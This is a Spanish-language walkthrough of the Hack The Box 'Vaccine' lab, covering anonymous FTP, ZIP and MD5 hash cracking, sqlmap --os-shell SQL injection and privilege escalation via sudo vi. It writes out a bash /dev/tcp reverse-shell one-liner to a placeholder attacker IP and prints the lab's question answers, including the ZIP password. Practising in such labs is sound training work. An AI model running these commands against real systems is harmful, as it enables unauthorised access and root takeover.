| | |
| ---------- | ------------------------------------------------------------ |
| Plataforma | Hack The Box – Starting Point |
| OS | Linux |
| Dificultad | Easy |
| Técnicas | FTP anónimo · John the Ripper · SQLi · os-shell · PrivEsc vi |
| Objetivo | Obtener user.txt y root.txt |

 

# **1. Reconocimiento inicial**

El primer paso es identificar qué servicios expone la máquina. Usamos nmap para escanear puertos y versiones.

## **1.1 Escaneo con nmap**

| |
|---|
|nmap -sC -sV -oN vaccine.txt 10.129.34.252<br><br># Resultado esperado:<br><br>21/tcp  open  ftp     vsftpd 3.0.3<br><br>22/tcp  open  ssh     OpenSSH 8.0<br><br>80/tcp  open  http    Apache httpd 2.4.41|

| |
|---|
|**ℹ️  INFO — Servicios descubiertos**<br><br>    Puerto 21 → FTP (permite login anónimo)<br><br>    Puerto 22 → SSH (acceso posterior con credenciales)<br><br>    Puerto 80 → Servidor web con panel de login|

# **2. Acceso FTP anónimo**

El servidor FTP permite autenticación anónima. Nos conectamos y descargamos el archivo disponible.

| |
|---|
|ftp 10.129.34.252<br><br># Name: anonymous<br><br># Password: (Enter vacío)<br><br>ftp> ls -la<br><br>ftp> get backup.zip<br><br>ftp> bye|

| |
|---|
|**⚠️  AVISO — Cliente FTP**<br><br>    El cliente ftp clásico NO usa flags -u ni -p.<br><br>    Alternativa más cómoda:  lftp -u anonymous, 10.129.34.252<br><br>    Para descargar directorios enteros con lftp:  mirror /ruta ./local|

# **3. Cracking del archivo ZIP protegido**

El archivo backup.zip está protegido con contraseña. Usamos zip2john + John the Ripper para crackearla.

## **3.1 ¿Qué es zip2john?**

zip2john es el script incluido en el toolset de John the Ripper que convierte un ZIP protegido en un hash crackeable.

## **3.2 Proceso completo**

| |
|---|
|# 1. Generar el hash del ZIP<br><br>zip2john backup.zip > hash.txt<br><br># 2. Verificar el hash generado<br><br>cat hash.txt<br><br># 3. Crackear con rockyou<br><br>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt<br><br># 4. Ver contraseña encontrada<br><br>john hash.txt --show<br><br># Resultado: backup.zip:741852963<br><br># 5. Descomprimir<br><br>unzip backup.zip   # contraseña: 741852963|

| |
|---|
|**✅  OBJETIVO — Contraseña del ZIP encontrada**<br><br>    Contraseña: 741852963<br><br>    Archivos extraídos: index.php, style.css|

# **4. Análisis de index.php — Credenciales admin**

El archivo index.php contiene el código del login. Dentro encontramos el hash MD5 de la contraseña del admin.

| |
|---|
|cat index.php<br><br># Línea clave:<br><br>if($_POST['username'] === 'admin' &&<br><br>   md5($_POST['password']) === '2cb42f8734ea607eefed3b70af13bbd3')|

## **4.1 Cracking del hash MD5**

El hash MD5 debe crackearse para obtener la contraseña en texto plano.

| |
|---|
|# Opción 1 — John the Ripper<br><br>echo '2cb42f8734ea607eefed3b70af13bbd3' > hash_md5.txt<br><br>john hash_md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5<br><br>john hash_md5.txt --show<br><br># Opción 2 — Hashcat<br><br>hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt<br><br># Opción 3 — Online: https://crackstation.net|

| |
|---|
|**🔴  PELIGRO — Nunca enviar el hash como respuesta**<br><br>    HTB pide la contraseña en TEXTO PLANO, no el hash MD5.<br><br>    El hash es: 2cb42f8734ea607eefed3b70af13bbd3<br><br>    La respuesta correcta es el resultado del cracking.|

## **4.2 Comparativa: ftp vs lftp**

|**Característica**|**ftp (clásico)**|**lftp (moderno)**|
|---|---|---|
|Autocompletado Tab|❌|✅|
|Descargar directorio|❌|✅ mirror|
|Reconexión automática|❌|✅|
|Soporte FTPS/SFTP/HTTP|❌|✅|
|Disponible por defecto|✅|❌ (instalar)|

 

# **5. Explotación — SQL Injection con sqlmap**

Una vez dentro del panel de administración en el puerto 80, encontramos un parámetro vulnerable a inyección SQL.

## **5.1 Obtener cookie de sesión**

| |
|---|
|# 1. Loguearse en http://10.129.34.252 con admin:PASSWORD<br><br># 2. Abrir F12 → Application → Cookies<br><br># 3. Copiar el valor de PHPSESSID|

## **5.2 Lanzar sqlmap con --os-shell**

La opción --os-shell de sqlmap intenta obtener ejecución de comandos en el sistema operativo a través de la inyección SQL.

| |
|---|
|sqlmap -u 'http://10.129.34.252/dashboard.php?search=1' \<br><br>       --cookie='PHPSESSID=TU_COOKIE_AQUI' \<br><br>       --os-shell|

| |
|---|
|**🔴  PELIGRO — Respuesta a pregunta de HTB**<br><br>    What option can be passed to sqlmap to try to get command execution via the SQL injection?<br><br>    Respuesta: --os-shell|

# **6. Reverse Shell — Shell estable**

La os-shell de sqlmap es inestable. Conviene lanzar una reverse shell real para trabajar cómodamente.

## **6.1 Preparar listener en tu máquina**

| |
|---|
|nc -lvnp 4444|

## **6.2 Lanzar reverse shell desde os-shell**

| |
|---|
|# Desde la os-shell de sqlmap:<br><br>bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'|

## **6.3 Estabilizar la shell**

| |
|---|
|python3 -c 'import pty; pty.spawn("/bin/bash")'<br><br>export TERM=xterm<br><br># Ctrl+Z<br><br>stty raw -echo; fg|

| |
|---|
|**ℹ️  INFO — ¿Por qué estabilizar la shell?**<br><br>    Sin estabilizar: no hay Ctrl+C, no hay historial, no hay autocompletado.<br><br>    Con python3 pty + stty obtenemos una TTY interactiva completa.|

 

# **7. Flag de usuario (user.txt)**

Ya dentro del servidor como el usuario postgres, buscamos el archivo user.txt.

| |
|---|
|whoami<br><br># postgres<br><br>find / -name user.txt 2>/dev/null<br><br>cat /ruta/encontrada/user.txt|

# **8. Escalada de privilegios — sudo vi**

El usuario postgres puede ejecutar vi como root sin contraseña. Esto permite escapar a una shell root.

## **8.1 Verificar permisos sudo**

| |
|---|
|sudo -l<br><br># Resultado:<br><br>User postgres may run the following commands:<br><br>    (root) NOPASSWD: /bin/vi|

## **8.2 Escalar a root con vi**

| |
|---|
|# 1. Abrir vi como root<br><br>sudo vi<br><br># 2. Dentro de vi, escribir:<br><br>:!/bin/bash<br><br># 3. ¡Ya somos root!<br><br>whoami<br><br># root|

| |
|---|
|**🔴  PELIGRO — Respuesta a pregunta de HTB**<br><br>    ¿Qué programa puede ejecutar el usuario postgres como root usando sudo?<br><br>    Respuesta: vi<br><br>    Referencia: GTFOBins → https://gtfobins.github.io/gtfobins/vi/|

| |
|---|
|**ℹ️  INFO — ¿Por qué funciona esto?**<br><br>    vi permite ejecutar comandos de shell con :!comando<br><br>    Si vi se ejecuta como root (sudo vi), el shell que lanza también es root.<br><br>    GTFOBins es el recurso de referencia para explotar binarios con sudo/suid.|

# **9. Flag de root (root.txt)**

| |
|---|
|# Ya como root:<br><br>cat /root/root.txt|

| |
|---|
|**✅  OBJETIVO — Máquina completada**<br><br>    user.txt  → /var/lib/postgresql/user.txt (o similar)<br><br>    root.txt  → /root/root.txt<br><br>    ¡Vaccine pwned!|

 

# **10. Diagrama de flujo — Resumen del ataque**

| |
|---|
|**🔍  RECONOCIMIENTO  →  nmap -sC -sV 10.129.34.252**|
|▼|
|**📂  FTP ANÓNIMO  →  ftp + get backup.zip**|
|▼|
|**🔑  CRACK ZIP  →  zip2john + john --wordlist=rockyou.txt**|
|▼|
|**📄  ANÁLISIS index.php  →  Hash MD5 admin**|
|▼|
|**💥  CRACK MD5  →  john / hashcat / crackstation.net**|
|▼|
|**🌐  LOGIN WEB  →  admin : PASSWORD**|
|▼|
|**💉  SQL INJECTION  →  sqlmap --os-shell**|
|▼|
|**🐚  REVERSE SHELL  →  nc -lvnp 4444**|
|▼|
|**📋  USER FLAG  →  find / -name user.txt**|
|▼|
|**⬆️  PRIVESC  →  sudo vi → :!/bin/bash**|
|▼|
|**👑  ROOT FLAG  →  cat /root/root.txt**|

# **11. Respuestas a las preguntas de HTB**

|**Pregunta**|**Respuesta**|
|---|---|
|Script para generar hash de ZIP en John|zip2john|
|Contraseña del ZIP backup.zip|741852963|
|Contraseña del admin en la web|[resultado del crack MD5]|
|Opción sqlmap para command execution|--os-shell|
|Programa que postgres ejecuta como root|vi|

# **12. Recursos útiles**

GTFOBins — Binarios explotables con sudo/SUID:

  https://gtfobins.github.io/gtfobins/vi/

CrackStation — Cracking de hashes online:

  https://crackstation.net

PayloadsAllTheThings — Reverse shells:

  https://github.com/swisskyrepo/PayloadsAllTheThings

HackTricks — Guías de pentesting:

  https://boo



---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad.md|11.06.2026 HTB Starting Point Tier 2 Appointment Completa y SQL Injection en Profundidad]] — John / Hashcat, Linux, Nmap
- [[Reactor_HTB.md|Reactor_HTB]] — John / Hashcat, Linux, Nmap
- [[../../apuntes Andres/12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype.md|12.06.2026 HTB Starting Point Tier 2 Crocodile Completa y Tres Nuevos Conceptos en Archetype]] — Linux, Metasploit, SQLMap
- [[../../informes/Informe_Inj3ctCrew.md|Informe_Inj3ctCrew]] — John / Hashcat, Linux, Nmap
- [[../../apuntes Joselu/MODULO3/resumen_master_clase33.md|resumen_master_clase33]] — Linux, Metasploit, SQLMap
- [[../../Apuntes/08 - Metodologías/Metodología - Explotación Linux.md|Metodología - Explotación Linux]] — Linux, Metasploit, Netcat / Reverse Shells

### 🛠️ Herramientas

- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SQLMap|SQLMap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]

> #escalada-privilegios #hack-the-box #john #linux #metasploit #netcat #nmap #post-explotacion #redes #reverse-shell #sqli #sqlmap #ssh
